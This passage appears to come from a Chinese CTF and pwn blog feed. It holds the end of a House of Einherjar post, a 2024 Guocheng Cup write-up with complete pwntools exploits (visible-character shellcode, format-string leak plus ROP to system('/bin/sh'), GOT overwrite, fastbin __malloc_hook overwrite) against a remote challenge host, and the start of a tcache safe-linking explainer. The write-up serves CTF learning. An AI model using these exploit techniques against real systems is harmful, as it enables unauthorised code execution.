class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">environ=libc_addr+libc.sym[<span class="string">&#x27;__environ&#x27;</span>]</span><br><span class="line"><span class="comment">#0x6021480x6021500x602158</span></span><br><span class="line">fake_pad = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0xd8</span>)+ p64(environ) + <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span> + p64(<span class="number">0x602148</span>)</span><br><span class="line"><span class="comment">#chunk1         chunk2_size   chunk2 </span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0xf8</span>,fake_pad)</span><br><span class="line">p.recvuntil(<span class="string">&#x27; # CONTENT: &#x27;</span>)</span><br><span class="line">environ_addr =u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">ret=environ_addr-<span class="number">0xf0</span></span><br><span class="line">log_addr(<span class="string">&quot;ret&quot;</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(ret))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p64(<span class="number">0x45226</span>+libc_addr))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;(CMD)&gt;&gt;&gt; &#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;Q&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;cat ../flag\n&quot;</span>)</span><br><span class="line">    <span class="comment"># debug(p)</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>environ中存在一个栈地址，因此把chunk1改为environ可泄露栈地址，把chunk2改为0x602148，在泄露地址后，把其改为返回地址，再次edit,把返回地址改为one_gadget，退出程序,即可getshell.</p><h4 id="0x04-参考链接"><a href="#0x04-参考链接" class="headerlink" title="0x04.参考链接"></a>0x04.参考链接</h4><p><a href="https://www.anquanke.com/post/id/251596#h2-1">PWN——House Of Einherjar CTF Wiki例题详解-安全KER - 安全资讯平台</a></p><p><a href="https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/house-of-einherjar/">House Of Einherjar - CTF Wiki</a></p><p><a href="https://blog.csdn.net/qq_41202237/article/details/117112930">好好说话之House Of Einherjar-CSDN博客</a></p>]]></content>
      
      
      <categories>
          
          <category> pwn学习总结 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> house of einherjar </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2024国城杯wp</title>
      <link href="/2024/12/07/%E5%9B%BD%E5%9F%8E%E6%9D%AFwp/"/>
      <url>/2024/12/07/%E5%9B%BD%E5%9F%8E%E6%9D%AFwp/</url>
      
        <content type="html"><![CDATA[<p>tools源码</p><p><a href="https://zikh26.github.io/posts/ad411136.html#debug">https://zikh26.github.io/posts/ad411136.html#debug</a></p><h4 id="Alpha-Shell"><a href="#Alpha-Shell" class="headerlink" title="Alpha_Shell"></a>Alpha_Shell</h4><p>题目是一个可见字符shellcode，限制0x150字节，题目开启沙箱，禁用了open,read,write和execve,选择openat和sendfile读出flag,使用alpha3工具生成可见字符的shellcode,</p><p>Exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span>*</span><br><span class="line"><span class="comment"># from ae64 import AE64</span></span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p,e,libc=load(<span class="string">&quot;./alpha&quot;</span>,<span class="string">&quot;125.70.243.22:31040&quot;</span>)</span><br><span class="line">debug(p,<span class="string">&quot;pie&quot;</span>,<span class="number">0x15AF</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;go!&quot;</span>)</span><br><span class="line"></span><br><span class="line">shellcode=<span class="string">&quot;Rh0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M15103e0y4s3c2D0x3j3d2s1K3p3b2D1M0I3q2K0a2L4M0r000J7L2v1o130U2s0y3T3F118L4w0z4t3f2I8M4J1L1L8O2Z113r7o0O1O1M8M7n8N380y4z3f7M13311M0H3q7M4p4D0q0y194L1L3d400R7k0q03&quot;</span></span><br><span class="line"></span><br><span class="line">p.send(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line">    <span class="comment"># shellcode=&#x27;&#x27;&#x27;</span></span><br><span class="line">    <span class="comment"># xor rax,rax</span></span><br><span class="line">    <span class="comment"># add rax,0x41</span></span><br><span class="line">    <span class="comment"># add rax,0x60</span></span><br><span class="line">    <span class="comment"># add rax,0x60</span></span><br><span class="line">    <span class="comment"># xor r10,r10</span></span><br><span class="line">    <span class="comment"># push r10</span></span><br><span class="line">    <span class="comment"># mov rdi,0x67616c662f010101</span></span><br><span class="line">    <span class="comment"># push rdi     </span></span><br><span class="line">    <span class="comment"># mov rsi,rsp</span></span><br><span class="line">    <span class="comment"># inc rsi</span></span><br><span class="line">    <span class="comment"># inc rsi</span></span><br><span class="line">    <span class="comment"># inc rsi</span></span><br><span class="line">    <span class="comment"># xor rdi,rdi              </span></span><br><span class="line">    <span class="comment"># xor rdx,rdx</span></span><br><span class="line">    <span class="comment"># syscall           </span></span><br><span class="line">    <span class="comment"># xor rdi,rdi</span></span><br><span class="line">    <span class="comment"># inc rdi        </span></span><br><span class="line">    <span class="comment"># mov rsi, rax      </span></span><br><span class="line">    <span class="comment"># xor rdx, rdx      </span></span><br><span class="line">    <span class="comment"># xor r10,r10</span></span><br><span class="line">    <span class="comment"># add r10,0x40  </span></span><br><span class="line">    <span class="comment"># xor rax,rax</span></span><br><span class="line">    <span class="comment"># add rax,40      </span></span><br><span class="line">    <span class="comment"># syscall          </span></span><br><span class="line">    <span class="comment"># &#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><h4 id="Offensive-Security"><a href="#Offensive-Security" class="headerlink" title="Offensive_Security"></a>Offensive_Security</h4><p>ida打开程序，发现一个login函数，无法看到login函数的内部，ida打开程序附带的lib2shell.so可以看到login，vuln等函数的内部逻辑，login函数中有一个格式化字符串漏洞，可以用来泄露栈中存储的反转后的password，和libc基地址，</p><p>通过password的判断后，程序进入到vuln函数中，vuln函数创建两个线程，一个执行checker函数，一个执行guess函数，向两个函数都输入1后，checker函数返回到shell,有一个栈溢出，用泄露的libc地址，布置system(“&#x2F;bin&#x2F;sh”)的rop链即可，执行system时遇到了栈对齐，在rop前加一条ret指令即可。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p,e,libc=load(<span class="string">&quot;./offensive&quot;</span>,<span class="string">&quot;125.70.243.22:31457&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line">lib2=ELF(<span class="string">&quot;./lib2shell.so&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_bytes_32</span>(<span class="params">addr</span>):</span><br><span class="line">    byte_array = addr.to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;big&#x27;</span>) </span><br><span class="line">    reversed_byte_array = byte_array[::-<span class="number">1</span>]</span><br><span class="line">    reversed_addr = <span class="built_in">int</span>.from_bytes(reversed_byte_array, byteorder=<span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> reversed_addr</span><br><span class="line">pop_rdi=<span class="number">0x0000000000400661</span></span><br><span class="line">ret=<span class="number">0x0000000000400462</span></span><br><span class="line">debug(p,<span class="number">0x400613</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Username:&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;%13$p%6$p&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">passwd=<span class="built_in">int</span>(p.recv(<span class="number">8</span>),<span class="number">16</span>)</span><br><span class="line">passwd=reverse_bytes_32(passwd)</span><br><span class="line">log_addr(<span class="string">&quot;passwd&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x21b780</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;password:&quot;</span>)</span><br><span class="line">p.send(p32(passwd)+p32(passwd))</span><br><span class="line">p.recvuntil(<span class="string">&quot;code:&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;success!&quot;</span>)</span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x28</span>+p64(ret)+p64(pop_rdi)+p64(libc_base+<span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh\x00&quot;</span>)))+p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]+libc_base)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="beverage-store"><a href="#beverage-store" class="headerlink" title="beverage store"></a>beverage store</h4><p>题目没有开启pie,RELRD没有开全，可以改got表，题目首先要求输入id和id authentication code，后一个会和一个随机数进行比较，如果不一样结束程序，gdb调试几次后发现，这个随机数是固定的，可以通过这个if判断，然后进入buy函数，首先输入v0,但是只限制了v0的上界为4，下界没有限制，可以去改存储在section之下的got表，第一次改exit的got表为buy函数，实现循环，第二次执行buy函数，选一个内部是libc地址的got表不改变其内容，通过程序的</p><p>puts(&amp;section[16 * v0]);泄露出其中的libc地址，然后第3次改printf的got表为system，第4次改exit的got表为程序的后门vuln函数，getshell.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p,e,libc=load(<span class="string">&quot;./store&quot;</span>,<span class="string">&quot;125.70.243.22:31457&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;id&quot;</span>,<span class="string">b&#x27;\xff&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;code:&quot;</span>,<span class="built_in">str</span>(<span class="number">0xf31db3b</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;wine&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">4</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;choose&quot;</span>)</span><br><span class="line">p.send(p64(<span class="number">0x40133b</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;wine&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">5</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;choose&quot;</span>)</span><br><span class="line">p.send(<span class="string">&quot;a&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;\x65\x64\x0a&quot;</span>)</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x81561</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">debug(p,<span class="number">0x4013fc</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;wine&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">7</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;choose&quot;</span>)</span><br><span class="line">p.send(p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;wine&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(-<span class="number">4</span>))</span><br><span class="line">p.recvuntil(<span class="string">&quot;choose&quot;</span>)</span><br><span class="line">p.send(p64(<span class="number">0x401511</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h4 id="vtable-hijack"><a href="#vtable-hijack" class="headerlink" title="vtable_hijack"></a>vtable_hijack</h4><p>2.23堆，题目存在uaf，并且edit不限制字节，</p><p>申请一个0x500的chunk,和几个0x60的chunk,</p><p>通过释放0x500的chunk，落入unsorted bin,然后show，得到其中的libc地址</p><p>然后释放两个0x60的chunk,修改后一个进入fastbin的chunk的fd为malloc_hook-0x23，然后把malloc_hook申请出来，改malloc_hook为one_gadget，再申请一个chunk,成功getshell.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tools <span class="keyword">import</span>*</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment"># p,e,libc=load(&quot;./heap&quot;)</span></span><br><span class="line"><span class="comment"># p=process(&quot;./pwn&quot;)</span></span><br><span class="line">p=remote(<span class="string">&quot;125.70.243.22&quot;</span>,<span class="number">31464</span>)</span><br><span class="line">e=ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc.so.6&quot;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;size:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,size,content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;length:&quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;content:&quot;</span>,content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;choice:&quot;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index:&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x500</span>)</span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">show(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">gadgets=[<span class="number">0x3f3e6</span>,<span class="number">0x3f43a</span>,<span class="number">0xd5c07</span>]</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">0x8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x39bb78</span></span><br><span class="line">log_addr(<span class="string">&quot;libc_base&quot;</span>)</span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]-<span class="number">0x23</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">0x10</span>,p64(malloc_hook)*<span class="number">2</span>)</span><br><span class="line">add(<span class="number">4</span>,<span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x100</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0xc0</span>)</span><br><span class="line">add(<span class="number">6</span>,<span class="number">0x60</span>)</span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x100</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span>+p64(gadgets[<span class="number">2</span>]+libc_base))</span><br><span class="line">add(<span class="number">10</span>,<span class="number">0x10</span>)</span><br><span class="line">debug(p)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> wp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tcache bin key加密机制</title>
      <link href="/2024/11/20/tcache%20bin%20%E7%9A%84key%E5%8A%A0%E5%AF%86%E6%9C%BA%E5%88%B6/"/>
      <url>/2024/11/20/tcache%20bin%20%E7%9A%84key%E5%8A%A0%E5%AF%86%E6%9C%BA%E5%88%B6/</url>
      
        <content type="html"><![CDATA[<h2 id="tcache-bin-的引入"><a href="#tcache-bin-的引入" class="headerlink" title="tcache bin 的引入"></a>tcache bin 的引入</h2><p>在2.26版本引入了tcache bin引入的一种内存管理机制,用于管理空闲的chunk。同时，tcache 引入了两个新的结构体，tcache_entry和tcache_perthread_struct,首先分析一下这两个结构体</p><h4 id="tcache-entry"><a href="#tcache-entry" class="headerlink" title="tcache_entry"></a>tcache_entry</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">next</span>;</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>tcache_entry结构体用于链接空闲的chunk结构体，其中的next指针，指向下一个相同大小的chunk.通过next指针链接，tcache bin形成了单链表结构。其中next指针位于chunk的fd位置</p><h4 id="tcache-perthread-struct"><a href="#tcache-perthread-struct" class="headerlink" title="tcache_perthread_struct"></a>tcache_perthread_struct</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tcache_perthread_struct</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tcache_entry</span> *<span class="title">entries</span>[<span class="title">TCACHE_MAX_BINS</span>];</span> </span><br><span class="line">    <span class="type">char</span> counts[TCACHE_MAX_BINS];         </span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>每个线程都会维护一个tcache_perthread_struct，用于管理整个tcache bin的结构</p><p>unsigned int counts[TCACHE_MAX_BINS] 用于存放每个bins中存放的空闲块的数量</p><p>struct tcache_entry *entries[] 用于存放每个bin的第一个chunk地址</p><p>其中TCACHE_MAX_BINS规定可以管理的不同大小的bin块的数量，bin块大小以此类推，从而间接决定了tcache bin可以管理的最大bin块的大小。</p><h3 id="tcache-bin的key加密机制"><a href="#tcache-bin的key加密机制" class="headerlink" title="tcache bin的key加密机制"></a>tcache bin的key加密机制</h3><p>在libc2.29的版本后，tcache bin引入了tcache的key加密机制，tcache_entry中新加了一个指针key,</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct tcache_entry &#123;</span><br><span class="line">    struct tcache_entry *next;</span><br><span class="line">void key;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>分析一下空闲的chunk进入tcache bin的过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">tcache_put (mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache_key;</span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>tcache_put首先把得到的chunk指针转化为tcache_entry类型，这里<code>chunk2mem</code>是返回我们<code>chunk</code>的<code>mem</code>区域，mem区域是指用户可用的区域即user data。</p><p>tcache_key<code>传入到</code>e-&gt;key的位置，标记这个chunk已经被释放，避免发生双重释放的问题。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">initialize_tcache_key</span><span class="params">()</span> &#123;</span><br><span class="line">    tcache_key = get_random_value() ^ (<span class="type">uintptr_t</span>)&amp;tcache_key;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//tcachekey的计算方法</span></span><br></pre></td></tr></table></figure><p>key存储在fd之后的内存区域中。</p><p>即为2.29 tcache bin防止双重释放的方法。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br></pre></td></tr></table></figure><p>将当前内存块插入到了链表的最前面</p><p>2.32版本引入了safe-linking机制</p><p>其中PROTECT_PTR涉及到了对进入next指针的加密操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>计算方法是当前释放的chunk的next值是由我们释放的chunk的指针右移12位，然后再与上一个chunk的指针异或得到的。</p><h4 id="demo"><a href="#demo" class="headerlink" title="demo"></a>demo</h4><p>这里我写了一个简单的demo来演示这个过程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;unistd.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;stdlib.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *num=<span class="number">0x123456</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> *a=<span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"><span class="type">int</span> *b=<span class="built_in">malloc</span>(<span class="number">0x60</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Chunk &#x27;b&#x27; base address: %p\n&quot;</span>, (<span class="type">void</span> *)b);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;num  address: 